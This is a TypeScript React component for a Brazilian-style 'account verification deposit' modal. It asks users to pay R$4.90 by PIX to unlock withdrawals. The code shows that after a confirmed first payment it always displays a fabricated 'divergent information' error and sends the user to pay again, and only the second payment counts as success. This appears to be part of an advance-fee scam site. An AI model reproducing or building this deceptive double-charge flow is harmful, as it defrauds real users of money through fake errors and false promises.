import React, { useState, useEffect } from 'react';
import { X, Shield, QrCode, CheckCircle, AlertTriangle, Clock } from 'lucide-react';
import { useFictionalPix } from '../hooks/useFictionalPix';
import { QRCodeGenerator } from './QRCodeGenerator';

interface KYCDepositModalProps {
  isOpen: boolean;
  onClose: () => void;
  onVerificationComplete: () => void;
  onVerificationError: () => void;
  isSecondAttempt?: boolean;
}

export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
  isOpen,
  onClose,
  onVerificationComplete,
  onVerificationError,
  isSecondAttempt = false
}) => {
  const { loading, pixData, createPix, checkPixStatus, reset } = useFictionalPix();
  const [isCheckingPayment, setIsCheckingPayment] = useState(false);
  const [paymentCheckInterval, setPaymentCheckInterval] = useState<NodeJS.Timeout | null>(null);
  const [showError, setShowError] = useState(false);
  const [copied, setCopied] = useState(false);
  const [step, setStep] = useState<'intro' | 'payment' | 'error'>('intro');

  const KYC_AMOUNT = 4.90;

  useEffect(() => {
    if (isOpen) {
      setStep('intro');
      reset();
      setShowError(false);
      setIsCheckingPayment(false);
    }
  }, [isOpen, reset]);

  useEffect(() => {
    if (!pixData || !isOpen) return;

    setIsCheckingPayment(true);

    const checkPayment = async () => {
      try {
        const status = await checkPixStatus(pixData.transactionId);

        if (status.status === 'paid') {
          if (paymentCheckInterval) {
            clearInterval(paymentCheckInterval);
            setPaymentCheckInterval(null);
          }

          setIsCheckingPayment(false);

          if (!isSecondAttempt) {
            setTimeout(() => {
              setStep('error');
              setShowError(true);

              setTimeout(() => {
                onVerificationError();
              }, 4000);
            }, 2000);
          } else {
            setTimeout(() => {
              onVerificationComplete();
            }, 2000);
          }
        }
      } catch (err) {
        console.error('Erro ao verificar pagamento:', err);
      }
    };

    checkPayment();

    const interval = setInterval(checkPayment, 3000);
    setPaymentCheckInterval(interval);

    return () => {
      if (interval) {
        clearInterval(interval);
      }
    };
  }, [pixData, isOpen, isSecondAttempt, checkPixStatus, onVerificationComplete, onVerificationError, paymentCheckInterval]);

  useEffect(() => {
    if (!isOpen) {
      if (paymentCheckInterval) {
        clearInterval(paymentCheckInterval);
        setPaymentCheckInterval(null);
      }
      setIsCheckingPayment(false);
      reset();
      setCopied(false);
    }
  }, [isOpen, paymentCheckInterval, reset]);

  if (!isOpen) return null;

  const handleStartVerification = async () => {
    setStep('payment');
    try {
      await createPix(KYC_AMOUNT);
    } catch (err) {
      console.error('Erro ao gerar PIX:', err);
    }
  };

  const copyPixCode = async () => {
    if (!pixData?.qrcode) return;

    try {
      await navigator.clipboard.writeText(pixData.qrcode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Erro ao copiar:', err);
    }
  };

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
      <div className="bg-gray-900 rounded-3xl max-w-md w-full max-h-[90vh] overflow-y-auto shadow-2xl border border-gray-800">
        {step === 'intro' && (
          <>
            <div className="bg-gradient-to-r from-accent to-accent-hover p-6 relative overflow-hidden">
              <div className="absolute inset-0 bg-white/5"></div>
              <button
                onClick={onClose}
                className="absolute top-4 right-4 text-white/80 hover:text-white transition-colors z-10"
              >
                <X className="w-6 h-6" />
              </button>

              <div className="relative z-10">
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-14 h-14 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center">
                    <Shield className="w-7 h-7 text-white" />
                  </div>
                  <div>
                    <h2 className="text-2xl font-bold text-white">Verificação de Conta</h2>
                    <p className="text-white/90 text-sm">Confirme sua titularidade</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="p-6">
              <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4 mb-6">
                <div className="flex items-center gap-3 mb-3">
                  <div className="w-10 h-10 bg-blue-500/20 rounded-xl flex items-center justify-center flex-shrink-0">
                    <Shield className="w-5 h-5 text-blue-400" />
                  </div>
                  <h3 className="text-blue-300 font-bold text-base">Por que esta verificação?</h3>
                </div>
                <p className="text-blue-300/90 text-sm leading-relaxed">
                  Para sua segurança e conforme regulamentação, precisamos confirmar que você é o titular da conta. Esta verificação libera funções financeiras como saques e depósitos.
                </p>
              </div>

              <div className="bg-gray-800 rounded-2xl p-5 mb-6 border border-gray-700">
                <div className="flex items-center justify-between mb-4">
                  <h4 className="text-white font-bold text-lg">Depósito de Verificação</h4>
                  <div className="bg-accent/20 px-3 py-1 rounded-full">
                    <span className="text-accent font-bold text-sm">Obrigatório</span>
                  </div>
                </div>

                <div className="bg-gray-900 rounded-xl p-4 mb-4 border border-gray-700">
                  <div className="text-center">
                    <div className="text-gray-400 text-xs mb-1">Valor da verificação</div>
                    <div className="text-3xl font-bold text-white mb-2">
                      R$ {KYC_AMOUNT.toFixed(2).replace('.', ',')}
                    </div>
                    <div className="bg-accent/10 border border-accent/30 rounded-lg px-3 py-2 inline-block">
                      <p className="text-accent text-xs font-semibold">
                        Valor será adicionado ao seu saldo após verificação
                      </p>
                    </div>
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center gap-2 text-gray-300 text-sm">
                    <div className="w-5 h-5 bg-accent/20 rounded-full flex items-center justify-center flex-shrink-0">
                      <CheckCircle className="w-3 h-3 text-accent" />
                    </div>
                    <span>Confirma titularidade da conta</span>
                  </div>
                  <div className="flex items-center gap-2 text-gray-300 text-sm">
                    <div className="w-5 h-5 bg-accent/20 rounded-full flex items-center justify-center flex-shrink-0">
                      <CheckCircle className="w-3 h-3 text-accent" />
                    </div>
                    <span>Libera saques e transferências</span>
                  </div>
                  <div className="flex items-center gap-2 text-gray-300 text-sm">
                    <div className="w-5 h-5 bg-accent/20 rounded-full flex items-center justify-center flex-shrink-0">
                      <CheckCircle className="w-3 h-3 text-accent" />
                    </div>
                    <span>Verificação instantânea por PIX</span>
                  </div>
                </div>
              </div>

              <button
                onClick={handleStartVerification}
                disabled={loading}
                className="w-full bg-accent text-white font-bold py-4 rounded-2xl hover:bg-accent-hover transition-all duration-300 active:scale-95 shadow-modern"
                style={{ touchAction: 'manipulation' }}
              >
                {loading ? (
                  <div className="flex items-center justify-center gap-3">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    <span>Gerando PIX...</span>
                  </div>
                ) : (
                  <div className="flex items-center justify-center gap-3">
                    <QrCode className="w-5 h-5" />
                    <span>Iniciar Verificação</span>
                  </div>
                )}
              </button>

              <div className="bg-gray-800/50 border border-gray-700 rounded-xl p-3 mt-4">
                <div className="flex items-start gap-2">
                  <Shield className="w-4 h-4 text-gray-400 mt-0.5 flex-shrink-0" />
                  <p className="text-gray-400 text-xs">
                    Processo 100% seguro e criptografado. Seus dados estão protegidos conforme LGPD.
                  </p>
                </div>
              </div>
            </div>
          </>
        )}

        {step === 'payment' && pixData && (
          <>
            <div className="bg-gradient-to-r from-accent to-accent-hover p-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-white/20 rounded-xl flex items-center justify-center">
                  <QrCode className="w-5 h-5 text-white" />
                </div>
                <div>
                  <h3 className="text-white font-bold text-lg">PIX Gerado</h3>
                  <p className="text-white/80 text-sm">R$ {KYC_AMOUNT.toFixed(2).replace('.', ',')}</p>
                </div>
              </div>
            </div>

            <div className="p-6 space-y-4">
              <div className="bg-gray-800 rounded-2xl p-4 text-center border border-gray-700">
                <div className="bg-white rounded-xl p-4 shadow-lg inline-block">
                  <QRCodeGenerator
                    value={pixData.qrcode}
                    size={180}
                    className="mx-auto"
                  />
                </div>
                <p className="text-gray-300 text-sm mt-3 font-medium">
                  Escaneie com o app do seu banco
                </p>
              </div>

              <div>
                <label className="block text-gray-300 font-bold mb-2 text-sm">
                  Código PIX (Copia e Cola):
                </label>
                <div className="bg-gray-800 rounded-xl p-3 border border-gray-700">
                  <input
                    type="text"
                    value={pixData.qrcode}
                    readOnly
                    className="w-full px-3 py-3 bg-gray-900 border border-gray-700 rounded-lg text-xs font-mono mb-3 focus:outline-none text-gray-300"
                    onClick={(e) => (e.target as HTMLInputElement).select()}
                  />
                  <button
                    onClick={copyPixCode}
                    className={`w-full px-4 py-3 rounded-lg font-bold transition-all duration-300 active:scale-95 ${
                      copied
                        ? 'bg-accent text-white'
                        : 'bg-accent text-white hover:bg-accent-hover'
                    }`}
                    style={{ touchAction: 'manipulation' }}
                  >
                    {copied ? (
                      <div className="flex items-center justify-center gap-2">
                        <CheckCircle className="w-4 h-4" />
                        <span>Código Copiado</span>
                      </div>
                    ) : (
                      <span>Copiar Código PIX</span>
                    )}
                  </button>
                </div>
              </div>

              <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-3">
                <h4 className="font-bold text-blue-300 mb-2 text-sm">Como pagar:</h4>
                <ol className="text-blue-300/90 text-xs space-y-1 list-decimal list-inside">
                  <li>Abra o app do seu banco</li>
                  <li>Escolha PIX Copia e Cola</li>
                  <li>Cole o código ou escaneie o QR Code</li>
                  <li>Confirme o pagamento de R$ {KYC_AMOUNT.toFixed(2).replace('.', ',')}</li>
                </ol>
              </div>

              {isCheckingPayment && (
                <div className="bg-accent/10 border border-accent/30 rounded-xl p-4">
                  <div className="flex items-center justify-center gap-3">
                    <div className="w-5 h-5 border-2 border-accent border-t-transparent rounded-full animate-spin"></div>
                    <p className="text-accent text-sm font-semibold">
                      Aguardando confirmação do pagamento...
                    </p>
                  </div>
                </div>
              )}
            </div>
          </>
        )}

        {step === 'error' && (
          <div className="p-6">
            <div className="bg-red-500/10 border-2 border-red-500/30 rounded-2xl p-6 text-center">
              <div className="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                <AlertTriangle className="w-8 h-8 text-red-400" />
              </div>
              <h3 className="text-red-400 font-bold text-xl mb-2">Erro na Verificação</h3>
              <p className="text-red-300 text-base mb-4">
                Informações divergentes detectadas.
              </p>
              <div className="bg-red-900/30 rounded-xl p-3 mb-4">
                <p className="text-red-300 text-sm">
                  Por favor, refaça a verificação KYC para continuar.
                </p>
              </div>
              <div className="flex items-center justify-center gap-2 text-red-400 text-xs">
                <Clock className="w-4 h-4" />
                <span>Redirecionando para nova verificação...</span>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
